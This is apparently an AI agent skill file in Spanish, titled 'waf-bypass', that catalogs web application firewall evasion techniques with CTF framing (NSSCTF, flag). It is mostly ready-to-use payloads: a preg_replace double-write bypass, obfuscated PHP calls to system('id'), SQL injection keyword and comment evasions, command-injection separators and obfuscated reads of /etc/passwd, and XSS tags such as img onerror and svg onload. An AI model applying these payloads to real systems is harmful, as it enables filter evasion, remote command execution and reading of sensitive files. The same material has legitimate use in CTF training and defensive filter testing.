---
name: waf-bypass
description: Biblioteca de técnicas de evasión de WAF — métodos de evasión para distintos tipos de WAF
---

# Biblioteca de Técnicas de Evasión de WAF

## Evasión de WAF en PHP

### Evasión mediante doble escritura en preg_replace (técnica clave)

`preg_replace()` realiza una **sustitución en bucle** hasta que no queden coincidencias, pero si al sustituir la palabra clave se **forma una nueva palabra clave**, solo se sustituye la ocurrencia interna, quedando la externa intacta.

**Principio central**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → elimina el `NSSCTF` del medio → queda `NSS` + `CTF` = `NSSCTF`

**Plantilla general**:
```
Supongamos que la palabra clave filtrada es X (p. ej. NSSCTF)
Construir la entrada: dividir X en dos mitades e insertar X completo en el medio

Es decir: primera mitad de X + X + segunda mitad de X

Ejemplos:
Se filtra NSSCTF → entrada NSS + NSSCTF + CTF = NSSNSSCTFCTF
Se filtra flag   → entrada fl + flag + ag = flflagag
Se filtra cat    → entrada ca + cat + t = cacatt
Se filtra system → entrada sys + system + tem = syssystemtem
```

**Por qué la simple evasión con mayúsculas/minúsculas no funciona con preg_replace**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` no coincide con `NSS` (sin el modificador i) → se devuelve `NssCTF` sin cambios
- `NssCTF !== "NSSCTF"` (falla la comparación estricta) → no se supera la validación
- Solo la evasión mediante doble escritura logra que, tras la sustitución, se obtenga **exactamente** la cadena de la palabra clave original

**Advertencia — cómo identificar el escenario**:
- Si el código fuente contiene `preg_replace('/palabra_clave/', '', $input)` y se requiere que `$input`, tras la sustitución, **sea igual a la propia palabra clave** → aplicar inmediatamente la evasión mediante doble escritura
- No intentar la evasión con mayúsculas/minúsculas (tras la sustitución no es igual a la palabra clave original) ni la evasión mediante codificación (la cadena codificada no es igual a la palabra clave original)

### Ofuscación de nombres de función
- Recuperación mediante decodificación Base64: `$f=base64_decode('c3lzdGVt');$f('id');`
- Concatenación de cadenas: `$f='sys'.'tem';$f('id');`
- Funciones variables: `$a='sys';$b='tem';$a$b('id');`

### Evasión de palabras clave
- División de rutas: `'/va'.'r/ww'.'w/ht'.'ml'`
- Evasión mediante comentarios: `sys/**/tem('id');`
- Cadena invertida: `$f=strrev('metsys');$f('id');`

## Evasión de inyección SQL

### Evasión de palabras clave
- Mezcla de mayúsculas/minúsculas: `SeLeCt` en lugar de `SELECT`
- Comentarios en línea: `S/*!ELECT*/`
- Doble codificación: `%2565` → `%65` → `e`
- Funciones equivalentes: `GROUP_CONCAT` en lugar de `concat_ws`

### Variantes del símbolo de comentario
- `-- -` en lugar de `--`
- `--+` en lugar de `-- `
- `#` en lugar de `--`

## Evasión de inyección de comandos

### Variantes de separadores
- Salto de línea: `id\nwhoami`
- Tubería: `id|whoami`
- Operador lógico: `id&&whoami`
- Subshell: `$(id)` o `` `id` ``

### Ofuscación de comandos
- Concatenación de variables: `a=i;b=d;$a$b`
- Comodines: `/bin/ca? /etc/pas?d`
- Variable vacía: `c'a't /etc/passwd`
- Escape: `c\at /etc/passwd`

## Evasión de XSS

### Variantes de etiquetas
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### Manejadores de eventos
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### Evasión mediante codificación
- Codificación de entidades HTML
- Codificación Unicode
- Codificación Base64 (combinada con eval)
